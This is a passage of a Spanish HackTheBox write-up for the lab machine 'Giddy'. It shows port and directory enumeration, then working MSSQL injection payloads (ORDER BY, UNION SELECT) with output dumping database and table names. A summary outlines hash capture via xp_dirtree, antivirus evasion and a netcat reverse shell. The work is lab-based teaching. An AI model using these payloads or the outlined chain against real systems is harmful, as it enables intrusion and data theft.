---
layout      : post
title       : "HackTheBox - Giddy"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png
category    : [ htb ]
tags        : [ SQLi, C, bypass-AV, MSSQL, xp_dirtree, responder, unifi-video ]
---
Máquina Windows nivel medio. Jugaremos con **inyecciones SQL** del servicio **MSSQL**. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (**smbclient** y **responder**) para obtener cositas (**hashes**). Y jugaremos a bypassear **antivirus**, **Windows Defender** y **App Lockers** para subir binarios maliciosos (o quizás no tan maliciosos e incluso sutiles como dos líneas de código).

![153giddyHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153giddyHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [lkys37en](https://www.hackthebox.eu/profile/709).

¡Una bestialidad ehh!

Máquina, máquinita, máquinota. Vamos inicialmente a jugar con un servidor web que mantiene dos recursos, una `PowerShell Web` y apartado con muuuchos productos, jugando con este último llegaremos a una **inyección SQL basada en errores**, esto en el servicio `Microsoft SQL Server`. 

Nos crearemos un liiiindo script para dumpear toda la data que queramos con respecto a **variables del sistema**, **tablas**, **columnas**, etc.

> [extract_data_sqli.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py)

Enumerando las bases de datos no encontraremos nada relevante, pasaremos a inyectar comandos del propio `MSSQL`, jugando con esto llegaremos a la función [xp_dirtree](https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html), la usaremos para por medio de la herramienta `responder` interceptar un hash `Net-NTLMv2` del usuario **Stacy**. 

Crackeando el hash conseguiremos una contraseña, haciendo reutilización de contraseñas y con la ayuda de `evil-winrm` obtendremos una sesión en la máquina como **Stacy**.

Encontraremos un servicio llamado `unifi-video` en el sistema, enumerando veremos una vulnerabilidad relacionada que permite escalar privilegios, esto debido a que una vez el servicio es detenido o iniciado va a intentar ejecutar un objeto llamado `taskkill.exe` de la ruta raíz del programa.

Podemos aprovecharnos de nuestros permisos para agregar un binario `taskkill.exe` con contenido malicioso en esa ruta y hacer que el servicio lo ejecute.

**PEEEEEROOO** no va a ser tan sencillo, ya que hay varias barreras, posiblemente exista un antivirus, el mismo `Windows Defender` o un `App Locker` bloqueando binarios por doquier. 

Jugando con `phantom-evasion` (no nos funciona para la explotación final) para evadir antivirus logramos hacer el bypass pero no la obtención de una **Shell**.

Finalmente nos crearemos un script que ejecute el binario `nc.exe`, lo compilaremos con ayuda de `mingw-w64` y lo nombraremos `taskkill.exe`, jugando y jugando lograremos que el servicio ejecute ese archivo y obtendremos una Reverse Shell enviada por **nc** hacia nuestra máquina como el usuario `NT authority system`.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Bastaaaaaante real y con vulnerabilidades conocidas, estas máquinas son fascinantes.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Es tu momento de brillar, disfruta cada instante.

1. [Enumeración](#enumeracion).
  * [Enumeración de puertos con nmap](#enum-nmap).
  * [Recorremos el servicio web del puerto 80 y el del puerto 443](#puerto-80).
2. [Explotación, encontramos inyección SQL basada en errores](#explotacion).
  * [Jugamos con <u>ORDER BY</u> para extraer el número concreto de columnas mediante la **SQLi**](#mvc-sqli-orderby).
  * [De las **25** columnas, vemos en cuáles podemos almacenar texto](#mvc-sqli-union-hola).
  * [Extraemos las **bases de datos** del servicio **MSSQL**](#mvc-sqli-dbs).
  * [Jugando con comandos de **MSSQL** para conectarnos a una carpeta compartida y extraer hashes **Net-NTLMv2**](#mvc-sqli-exec).
3. [Escalada de privilegios, explotamos el servicio **unifi-video**](#escalada-de-privilegios).
  * [Generamos archivo **taskkill.exe** malicioso](#msfvenom-taskkillexe).
  * [Buscamos servicio del sistema relacionado a **unifi-video**](#find-service-unifivideo).
  * [Intentamos que el servicio **unifi-video** ejecute **taskkill.exe** (binario malicioso)](#trying-service-taskkillexe).
  * [Evadimos **Antivirus**, **Windows Defender**, **App Locker** y lo que se venga](#bypass-av-and-things).

...

## Enumeración [#](#enumeracion) {#enumeracion}

---

### Enumeración de puertos con nmap [🔗](#enum-nmap) {#enum-nmap}

Veamos inicialmente que puertos tiene activos la máquina, así sabremos por donde empezar a tirar hilos:

```bash
❱ nmap -p- --open -v 10.10.10.104 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Nos responde:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Fri Jul 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.104
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.104 ()	Status: Up
Host: 10.10.10.104 ()	Ports: 80/open/tcp//http///, 443/open/tcp//https///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (65532)
# Nmap done at Fri Jul 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 280.46 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web. |
| 443    | **[HTTPS](https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto)**: Le agrega un certificado SSL para hacer "más fuerte" la seguridad de una web. |
| 3389   | **[ms-wbt-server](https://book.hacktricks.xyz/pentesting/pentesting-rdp)**: Al parecer es un puerto que nos provee con una interfaz gráfica para conectarnos a otros dispositivos. Confirmémoslo con el siguiente escaneo. |
| 5985   | **[WinRM](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/)**: Que nos permite realizar tareas administrativas remotamente (en pocas palabras) |

Teniendo los puertos, juguemos con un escaneo de versiones y scripts, así vemos más a detalle la info de cada puerto.

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.104
    [*] Open ports: 80,443,3389,5985

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 80,43,3389,5985 -sC -sV 10.10.10.104 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Obtenemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Fri Jul 23 25:25:25 2021 as: nmap -p 80,443,3389,5985 -sC -sV -oN portScan 10.10.10.104
Nmap scan report for 10.10.10.104
Host is up (0.11s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2021-07-23T15:29:06+00:00; +5m26s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2021-07-23T15:29:02+00:00
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2021-05-03T14:56:04
|_Not valid after:  2021-11-02T14:56:04
|_ssl-date: 2021-07-23T15:29:06+00:00; +5m26s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5m25s, deviation: 0s, median: 5m25s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.24 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Microsoft IIS httpd 10.0 |
| 443    | HTTPS    | Microsoft IIS httpd 10.0 |

Vemos un `commonName` muy atractivo:

* `commonName=PowerShellWebAccessTestWebSite`

Nos da la idea de tener una Shell en la web, ya veremos.

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 3389   | RDP      | Microsoft Terminal Services |

Muchas referencias al nombre **Giddy** (mayusculas y minusculas)

* `DNS_Computer_Name: Giddy`

Jmmm, pues empecemos a explorar cada puerto y descubramos por donde podemos romperlos.

...

### Puerto 80 [🔗](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un perrito :D de primeras se me ocurre algo con **estenografía** (ojalá no), pero sigamos explorando... Hagamos un fuzzeo de directorios a ver si algo se nos escapa de los ojos:

```bash
❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.104
...
Target: http://10.10.10.104/

[25:25:25] Starting: 
[25:25:25] 301 -  157B  - /aspnet_client  ->  http://10.10.10.104/aspnet_client/
[25:25:25] 302 -  157B  - /remote  ->  /Remote/default.aspx?ReturnUrl=%2fremote
[25:25:25] 301 -  157B  - /Aspnet_client  ->  http://10.10.10.104/Aspnet_client/
[25:25:25] 301 -  147B  - /mvc  ->  http://10.10.10.104/mvc/
[25:25:25] 301 -  157B  - /aspnet_Client  ->  http://10.10.10.104/aspnet_Client/
[25:25:25] 302 -  157B  - /Remote  ->  /Remote/default.aspx?ReturnUrl=%2fRemote
[25:25:25] 301 -  157B  - /ASPNET_CLIENT  ->  http://10.10.10.104/ASPNET_CLIENT/
[25:25:25] 400 -  324B  - /besalu%09
[25:25:25] 400 -  324B  - /error%1F_log
...
```

Opaa, encontramos tres rutas:

* `/aspnet_client`.
* `/remote`.
* `/mvc`.

Validando cada una, `/aspnet_client` nos devuelve `acceso denegado` :( si revisamos `/remote`, con ella si obtenemos respuesta y caemos acá:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perefeto, nos pide varias cosas, pero la principal es que nos movamos al servicio **HTTPS**, así que nos movemos a:

* `https://10.10.10.104/remote`

Y conseguimos el mismo output, pero sin el error del **SSL** (: Juguemos con el login a ver...

> `Windows PowerShell Web Access` (que llamaremos **PSWA**): "acts as a Windows PowerShell gateway, providing a **web-based Windows PowerShell console** that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device." [Install and Use Windows PowerShell Web Access](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)).

* [How to use Microsoft PowerShell Web Access](https://practical365.com/powershell-web-access-just-how-practical-is-it/).

Intentando algunas cositas como buscar `Windows PowerShell Web Access exploit` o credenciales por default, no conseguimos nada útil. 

Si nos fijamos ya sea con la extensión `Wappalyzer` de Firefox o con la herramienta `whatweb` vemos algo de `asp.net`:

```bash
❱ whatweb https://10.10.10.104/remote
https://10.10.10.104/remote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/default.aspx?ReturnUrl=%2fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]

https://10.10.10.104/Remote/default.aspx?ReturnUrl=%2fremote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/en-US/logon.aspx?ReturnUrl=%252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]

https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%252fremote [302 Found] ASP_NET[4.0.30319], Cookies[.redirect.], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.redirect.], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%25252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
```

Contamos con la versión `4.0.30319` de `asp.net`, buscando cositas en la web con esto tampoco llegamos a nada interesante o relevante :( 

...

Veamos la ruta `/mvc` de la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ufff, muchos recursos (si nos fijamos a la derecha del todo aún quedan varios scrolls hacia abajo y todo son links), notamos varias cositas:

* Un botón de **registro**: `http://10.10.10.104/mvc/Account/Register.aspx`.
* Un botón de **login**: `http://10.10.10.104/mvc/Account/Login.aspx`.
* 4 botones más, los 4 funcionales: 
  * `http://10.10.10.104/mvc/About.aspx`.
  * `http://10.10.10.104/mvc/Contact.aspx`.
  * `http://10.10.10.104/mvc/Search.aspx`.
* Los links que hacen referencia a nombres de productos tienen este formato:
  * `http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=12`, donde **12** puede ser cualquier número (o sea, cualquier producto).

Vaya, varias cositas para probar (eso de los productos tiene una cara de **SQLi** que ufff), pero vamos por orden.

Si nos creamos una cuenta, nos inicia sesión de una. Curiosamente no hay nada distinto a lo que vimos ya.

Jugando con el apartado `Search.aspx` tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si insertamos algo como `<h1>Hola</h1>`, para saber si podemos inyectar código HTML nos responde esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search_errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos devuelve un error, pero además de eso vemos varias cositas, como una ruta absoluta y algunas versiones que están siendo usadas con el servicio. Probando algo más interesante como inyectar consultas **SQL** no logramos nada, usamos estos dos payloads como base, de ellos vamos probando variaciones:

| Payload            | Descripción |
| ------------------ | :---------- |
| `1 order by 100`   | Así intentamos determinar cuantas columnas hay en la consulta actual, como ejemplo intentamos **100** columnas, si no existe ese número de columnas nos debería responder con un error, si llega el error sabemos que es vulnerable y debemos empezar a restar al **100** para encontrar el número de columnas (cuando ya no existan errores, tendremos el num de cols). |
| `1 or sleep(5)`    | Para ver si existe una vulnerabilidad **SQL** basada en tiempo (si la consulta se demora 5 segundos en responder, sabríamos que es vulnerable). |
| `;#`               | Hace referencia a un comentario (hay varias maneras), por lo que le decimos que tome toooooooodo lo que este después de nuestro payload como comentario para que no interfiera con nuestra explotación |

Pero lo dicho, jugando con `Search.aspx` con algunos payloads no llegamos a ningún lado, así que movámonos a los productos.

Seleccionamos cualquiera, por ejemplo el **33** que hace referencia a las *luces*:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_light.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, si jugamos con las columnas, encontramos algooooooooooooooooooooooo:

```html
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 100;#
```

> 33, 1, 2 o 234, da igual el numero.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opaaaaaaa, confirmamos **inyección SQL** (: vemos el error que nos indica que **100** está fuera de rango del número de columnas, así que debemos empezar a bajar el número y ver en que momento dejamos de ver el error.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

También vemos las versiones de antes, pero ahora hay una nueva ruta, y esta parecer ser donde residen todos los archivos del servicio web (: sigamos con la **SQLi**...

> Y un nuevo usuario, `jnogueira`, guardemoslo.

...

## Jugamos con la <u>inyección SQL</u> [#](#explotacion) {#explotacion}

---

### Encontramos número de columnas usando <u>ORDER BY</u> [🔗](#mvc-sqli-orderby) {#mvc-sqli-orderby}

Moviendo números encontramos el límite:

```html
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 26;#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order26.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

```html
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 25;#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order25.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, 25 columnas, ahora tenemos que jugar con todas y ver en cuál de ellas logramos almacenar valores.

### Descubrimos en cuáles podemos almacenar texto [🔗](#mvc-sqli-union-hola) {#mvc-sqli-union-hola}

---

* [Acá una guía de lo que debemos hacer - SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks).

Bien, pues creémonos un script superrápido que nos haga las 25 iteraciones (25 columnas) cambiando el valor de cada una por algún texto, si la respuesta del servidor no nos devuelve errores y por el contrario nos devuelve el texto, tendríamos una columna para jugar:

> [search_column_union.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/search_column_union.py)

---

```py
❱ python3 search_column_union.py 

[+] Payload: 33 UNION SELECT NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '2' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '3' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '6' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '11' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '12' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '13' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '16' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '17' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '18' de nuestro payload nos permite escribir en la web
```

Perfectisimo, ya vemos varios campos, podemos jugar con cualquiera, tomaré la columna número `2` (:

Antes de ponernos a dumpear las bases de datos debemos saber contra qué servicio **SQL** estamos enfrentándonos (algunos ya lo sabrán por los errores), para esto juguemos con la variable `@@version` y veamos:

### Vemos la <u>versión</u> del servicio <u>SQL</u> [🔗](#mvc-sqli-version) {#mvc-sqli-version}

Ya podemos quitarnos el bucle e indicarle donde queremos que juegue, entonces empecemos a generar nuestro script para extraer toda la data, pero lo dicho, primero veamos la versión y así saber con qué sintaxis tenemos que seguir la explotación:

```sql
33 UNION SELECT campos_null,ELcampoQUEqueremosVERdeLAdb,los_otros_23_campos_null,..,..,..;-- -
```

Entonces como respuesta, en la web veríamos `ELcampoQUEqueremosVERdeLAdb`:

> [Variables - extract_data_sqli.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L98)

Si lo ejecutamos vemos:

```bash
❱ python3 extract_data_sqli.py -f '@@version'
[+] Extrayendo la variable @@version del servicio SQL.
[+] @@version: 
    Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
        Oct 28 2016 18:17:30 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Standard 6.3 <X64> (Build 14393: ) (Hypervisor)
```

Opa, estamos ante el servicio de bases de datos [Microsoft SQL Server](https://searchdatacenter.techtarget.com/es/definicion/SQL-Server), pues ahora sabemos que no podemos usar las mismas **sentencias** que usamos con `MySQL`; es mi primer approach contra este servicio y su explotación, así que vamos a darle duro y aprendemos juntos.

Investigando encontramos varios recursos, podemos destacar 2:

* [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet).
* [MSSQL Practical Injection Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/).
* [Step By Step MSSQL Union Based Injection](http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html).

Vemos algunas variables para probar, intentemos ver el usuario que la base de datos actual:

```bash
❱ python3 extract_data_sqli.py -f 'user_name()'
[+] Extrayendo la variable user_name() del servicio SQL.
[+] user_name(): Giddy\stacy
```

```bash
❱ python3 extract_data_sqli.py -f 'user'
[+] Extrayendo la variable user del servicio SQL.
[+] user: Giddy\stacy
```

```bash
❱ python3 extract_data_sqli.py -f 'system_user'
[+] Extrayendo la variable system_user del servicio SQL.
[+] system_user: giddy\stacy
```

Listones, tenemos al usuario `stacy` para guardarlo en nuestros pensamientos, ahora sí, empecemos a explotar estooooooooooooooooooo!!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_letsgoseinfeld.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

### Extraemos las <u>bases de datos</u> actuales del servicio <u>MSSQL</u> [🔗](#mvc-sqli-dbs) {#mvc-sqli-dbs}

Con ayuda [del primer recurso](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) referenciado antes, vemos una manera de extraer todas las bases de datos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_monkey_mssql_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Juguemos con la última línea, armemos un bucle por ejemplo de **10** bases de datos y veamos que surge:

(Es prácticamente igual a nuestra inyección por campos, solo que en esta generamos un bucle para que vaya iterando entre las N bases de datos que existan)

```sql
33 UNION SELECT campos_null,DB_NAME(N),los_otros_23_campos_null,..,..,.. ORDER BY 1;-- -
```

Le indicamos el [ORDER BY 1](https://stackoverflow.com/questions/3445118/what-is-the-purpose-of-order-by-1-in-sql-select-statement) para que lo que nos devuelva lo posicione en la primera columna (así nos es más fácil jugar con el script).

> [Databases - extract_data_sqli.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L132)

Ejecutamos yyyyyy:

```bash
❱ python3 extract_data_sqli.py
[+] Extrayendo las bases de datos del servicio MSSQL.

[+] Base de datos [0]: Injection
[+] Base de datos [1]: master
[+] Base de datos [2]: tempdb
[+] Base de datos [3]: model
[+] Base de datos [4]: msdb
```

Bien, 5 bases de datos, juguemos inicialmente con `Injection` (que tiene un nombre moooooooooooooy llamativo) a ver que tablas tiene:

### Extraemos las <u>tablas</u> de la base de datos <u>Injection</u> [🔗](#mvc-sqli-tables) {#mvc-sqli-tables}

Acá ya empezamos a limitar los resultados a **1** por fila, así lo único que debemos hacer es cambiar la fila en la que estamos pero siempre recibiendo un resultado.

> Sé que se pudo haber hecho que una sola consulta arrojara tooodo y de ese toooodo extraer las cositas, pero me parecio más sencillo de implementar uno por uno.

```sql
33 UNION SELECT CAMPOS_NULL,table_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.tables ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
```

Donde nos extraerá el nombre de las tablas que hay en la DB `nombreDB`, esto obtenido de la consulta `information_schema.tables` PEEEEEEERO en vez de `LIMIT` (como `MySQL`) usamos `OFFSET` y `FETCH` para limitar los resultados. 

Lo que hacemos es decirle:

> "HEEEEY, limitame los resultados a solo uno (`FETCH FIRST 1 ROWS ONLY`) y ve cambiando la fila en la que te encuentras por favor (`OFFSET N` (donde N va de **0** a **1** a **2** y **al numero que sea**))"

* Tomado de [How to Limit Rows in a SQL Server Result Set](https://learnsql.com/cookbook/how-to-limit-rows-in-a-sql-server-result-set/).

> [Tables - extract_data_sqli.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L162)

```bash
❱ python3 extract_data_sqli.py --dump Injection

[+] Dumpeando tablas de la base de datos 'Injection': ✔
+----------------------+
| Tablas DB: Injection |
+----------------------+
| CreditCard           |
| Product              |
| ProductCategory      |
| ProductSubcategory   |
+----------------------+
```

Jmmm, 4 no más, veamos la tabla `CreditCard` a ver que columnas tiene:

### Extraemos las <u>columnas</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> [🔗](#mvc-sqli-columns) {#mvc-sqli-columns}

Exactamente igual, solo que agregamos contra que tabla queremos trabajar:

```sql
33 UNION SELECT CAMPOS_NULL,column_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.columns WHERE table_name='nombreTABLA' ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
```

Lo único que cambia es que extraemos las columnas de la DB `nombreDB` peeero que estén relacionadas con la tabla `nombreTABLA`, nada más.

> [Columns - extract_data_sqli.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L189)

```bash
❱ python3 extract_data_sqli.py --dump Injection CreditCard
[+] Dumpeando columnas de la tabla 'CreditCard' en la base de datos 'Injection': ✔

+--------------+
| Columnas     |
+--------------+
| CardNumber   |
| CardType     |
| CreditCardID |
| ExpMonth     |
| ExpYear      |
| ModifiedDate |
+--------------+
```

Ninguna columna es llamativa, jmmm, sin embargo intentemos ver algún valor, por ejemplo el de `CardType`:

### Vemos la data de la columna <u>CardType</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> [🔗](#mvc-sqli-data) {#mvc-sqli-data}

Y la más sencilla, solo le indicamos de donde queremos extraer QUÉ data.

```sql
33 UNION SELECT CAMPOS_NULL,nombreCAMPO,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB]..nombreTABLA ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -
```

Sencillito, le decimos: "extrae el campo `nombreCAMPO` de la tabla `nombreTABLA` que está en la DB `nombreDB`, muchas gracias".

> [Dump data - extract_data_sqli.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L213)

```bash
❱ python3 extract_data_sqli.py --dump Injection CreditCard CardType
[+] Extrayendo valores de la columna 'CardType' en Injection.CreditCard: ✔

+---------------+
| CardType      |
+---------------+
| ColonialVoice |
| Distinguish   |
| SuperiorCard  |
| Vista         |
